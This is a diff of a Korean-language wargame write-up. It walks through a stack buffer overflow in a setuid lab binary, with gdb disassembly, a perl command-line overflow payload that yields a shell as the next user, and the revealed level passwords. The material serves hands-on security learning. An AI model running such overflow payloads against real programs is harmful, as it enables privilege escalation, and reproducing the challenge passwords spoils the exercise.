@@ -5,7 +5,7 @@ lv0 비밀번호 : lv0
 알아야될 기초지식 : gdb 사용법
 
 ## lv 0
-gdb lv1으로 lv1이 무슨 프로그램인지 확인해본다.   
+gdb로 lv1이 무슨 프로그램인지 확인해보자.   
 ```pwndbg> disass main   
 Dump of assembler code for function main:   
    0x08048430 <+0>:	push   ebp   
@@ -65,7 +65,56 @@ uid=1001(lv1) gid=1000(lv0) groups=1000(lv0),4(adm),24(cdrom),27(sudo),30(dip),4
 알아낸 lv1 비번 : hello newbie!
 
 ## lv 1
+gbd로 lv2가 무엇을 하는 프로그램인지 확인해보자. 
+```
+pwndbg> disass main   
+Dump of assembler code for function main:   
+   0x08048430 <+0>:	push   ebp   
+   0x08048431 <+1>:	mov    ebp,esp   
+   0x08048433 <+3>:	sub    esp,0x10   
+   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1   
+   0x0804843a <+10>:	jg     0x8048453 <main+35>   
+   0x0804843c <+12>:	push   0x80484d0   
+   0x08048441 <+17>:	call   0x8048350 <printf@plt>    
+   0x08048446 <+22>:	add    esp,0x4   
+   0x08048449 <+25>:	push   0x0   
+   0x0804844b <+27>:	call   0x8048360 <exit@plt>   
+   0x08048450 <+32>:	add    esp,0x4   
+   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]   
+   0x08048456 <+38>:	add    eax,0x4   
+   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]   
+   0x0804845b <+43>:	push   edx   
+   0x0804845c <+44>:	lea    eax,[ebp-0x10]   
+   0x0804845f <+47>:	push   eax   
+   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>   
+   0x08048465 <+53>:	add    esp,0x8   
+   0x08048468 <+56>:	lea    eax,[ebp-0x10]   
+   0x0804846b <+59>:	push   eax   
+   0x0804846c <+60>:	push   0x80484dc   
+   0x08048471 <+65>:	call   0x8048350 <printf@plt>   
+   0x08048476 <+70>:	add    esp,0x8   
+   0x08048479 <+73>:	leave   
+   0x0804847a <+74>:	ret  
+   ```
+lv1 프로그램과 크게 다른점은 없다.   
 
+0x08048468 <+56>:	lea    eax,[ebp-0x10]   
+다른점이라고하면 strcpy에 16바이트밖에 못 담는다는 것이고  
+24바이트만에 ret까지 채워넣을 수 있게된다.
+
+따라서 lv1과 같은 방법으로 문제를 풀어주면 된다.
+
+실행결과
+```
+lv1@ubuntu:~$ ./lv2 `perl -e 'print "a"x20, "\xac\xda\xff\xff"'`
+aaaaaaaaaaaaaaaaaaaa����
+$ whoami
+lv2
+$ id
+uid=1002(lv2) gid=1001(lv1) groups=1001(lv1)
+```
+
+알아낸 lv2 비번 : tooo easy
 ## lv 2
 
 ## lv 3
